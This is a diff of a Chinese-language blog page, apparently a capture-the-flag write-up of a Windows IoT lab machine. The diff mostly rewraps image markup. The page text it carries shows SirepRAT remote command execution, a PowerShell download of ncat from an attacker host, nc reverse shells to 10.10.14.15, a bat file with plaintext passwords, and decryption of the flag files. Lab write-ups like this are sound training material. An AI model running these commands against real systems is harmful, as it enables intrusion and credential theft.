@@ -129,7 +129,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -225,7 +225,14 @@
 
 
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>Windows Device Portal,需要登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090101.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 看起来是个windows IOT，搜索资料：</p>
 <ul>
 <li>Windows 10 IoT Core远程命令执行漏洞验证及建议 - FreeBuf网络安全行业门户<br><a href="https://www.freebuf.com/articles/web/199292.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/199292.html</a></li>
@@ -237,36 +244,106 @@
 <h1 id="SirepRAT"><a href="#SirepRAT" class="headerlink" title="SirepRAT"></a>SirepRAT</h1><h2 id="download-ncat"><a href="#download-ncat" class="headerlink" title="download ncat"></a>download ncat</h2><p>任意执行命令，例如下载文件:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.15:7778/ncat.exe" --v</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090102.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090103.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>使用nc反弹shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.15 4444 -e powershell.exe" --v</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090104.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> whoami报错，可以使用<strong>$env:UserName</strong></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090105.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090105.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="搜集信息"><a href="#搜集信息" class="headerlink" title="搜集信息"></a>搜集信息</h1><p> 在这个目录发现一个bat文件，这个文件中有两组账号密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd "c:\Program Files\WindowsPowershell\Modules\PackageManagement"</span><br><span class="line">ls -force</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090106.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090106.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="r-bat"><a href="#r-bat" class="headerlink" title="r.bat"></a>r.bat</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">:LOOP</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /F <span class="string">"skip=6"</span> %%i <span class="keyword">in</span> (<span class="string">'net localgroup "administrators"'</span>) <span class="keyword">do</span> net localgroup <span class="string">"administrators"</span> %%i /delete</span><br><span class="line"></span><br><span class="line">net user app mesh5143</span><br><span class="line">net user administrator _1nt3rn37ofTh1nGz</span><br><span class="line"></span><br><span class="line">ping -n <span class="number">3</span> <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">cls</span><br><span class="line"></span><br><span class="line">GOTO :LOOP</span><br></pre></td></tr></table></figure>
 
 <h1 id="Windows-Device-Portal"><a href="#Windows-Device-Portal" class="headerlink" title="Windows Device Portal"></a>Windows Device Portal</h1><p>回到8080的web，可以使用<code>app:mesh5143</code>登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090107.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090107.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reverse-shell-1"><a href="#reverse-shell-1" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>Process -&gt; run command:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color\nc64.exe 10.10.14.15 4445 -e powershell.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090108.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090108.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>得到app用户shell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090109.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090109.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>app用户可以读取user.txt,同样需要通过powershell去读：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$credential</span> = <span class="built_in">Import-CliXml</span> -Path U:\Users\app\user.txt</span><br><span class="line"><span class="variable">$credential</span>.GetNetworkCredential().Password</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090110.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090110.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>前面bat文件里我们得到了两组密码，administrator也是同样流程，登录8080，执行命令，反弹shell，读取root.txt:</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">administrator _1nt3rn37ofTh1nGz</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\spool\drivers\color\nc64.exe <span class="number">10.10</span>.<span class="number">14.15</span> <span class="number">4446</span> -e powershell.exe</span><br><span class="line"></span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">Import-CliXml</span> -Path U:\Users\administrator\root.txt</span><br><span class="line"><span class="variable">$credential</span>.GetNetworkCredential().Password</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090111.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090111.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Windows 10 IoT Core远程命令执行漏洞验证及建议 - FreeBuf网络安全行业门户<br><a href="https://www.freebuf.com/articles/web/199292.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/199292.html</a></li>
 <li><a href="https://github.com/SafeBreach-Labs/SirepRAT" target="_blank" rel="noopener">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
